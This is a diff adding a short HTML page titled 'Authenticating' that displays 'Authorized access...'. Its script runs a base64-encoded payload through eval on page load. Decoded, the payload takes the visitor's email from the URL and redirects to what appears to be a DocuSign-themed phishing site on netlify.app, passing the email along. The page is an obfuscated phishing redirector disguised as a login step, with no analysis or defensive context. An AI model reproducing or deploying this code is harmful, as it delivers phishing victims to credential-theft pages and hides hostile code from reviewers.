@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Authenticating</title>
+</head>
+<body>
+    <p>Authorized access...</p>
+</body>
+<script>
+    // Base64-encoded redirection script
+    const scriptBase64 = `
+        Ly8gRXh0cmFjdCB0aGUgY3VycmVudCBVUkwgcGFyYW1ldGVyIGNhbGxlZCBlbWFpbAoKY29uc3Qg
+Y3VycmVudFVybCA9IHdpbmRvdy5sb2NhdGlvbi5ocmVmOwoKY29uc3QgZW1haWwgPSAoZnVuY3Rp
+b24oKSB7CiAgICBpZiAoY3VycmVudFVybC5pbmNsdWRlcygnP2VtYWlsPScpKSB7CiAgICAgICAg
+cmV0dXJuIG5ldyBVUkxTZWFyY2hQYXJhbWV0ZXJzKGN1cnJlbnRVcmwuc2VhcmNoKS5nZXQoJ2Vt
+YWlsJyk7CiAgICB9IGVsc2UgaWYgKGN1cnJlbnRVcmwuaW5jbHVkZXMoJyNlbnZlb3BnYXRlcz0n
+KSkgewogICAgICAgIHJldHVybiBjdXJyZW50VXJsLnNwbGl0KCc/ZW1haWw9JylbMV07CiAgICB9
+IGVsc2UgaWYgKGN1cnJlbnRVcmwuaW5jbHVkZXMoJyNlJykpIHsKICAgICAgICByZXR1cm4gY3Vy
+cmVudFVybC5zcGxpdCgnI2UnKVsxXTsKICAgIH0KICAgIHJldHVybiAnJzsKfSkoKTsKCi8vIFJl
+ZCBpcmVjdHMgdG8gdGhlIHNldCBkb21haW4gYW5kIHJlcGFzc2VkIGVtYWlsCgpjb25zdCByZWRp
+cmVjdFVybCA9ICJodHRwczovL2FwcHJvdi1kb2N1c2lnbnBheW91dGRvY3VtZW50Lm5ldGxpZnku
+YXBwLyIgKyAoZW1haWwgfHwgJycpOwoKLy8gU2V0cyB0aGUgbG9jYXRpb24gdG8gdGhlIHJlZGly
+ZWN0aW9uIGxpbmsKd2luZG93LmxvY2F0aW9uLmhyZWYgPSByZWRpcmVjdFVybDs=
+    `;
+    eval(atob(scriptBase64));
+</script>
+</html>
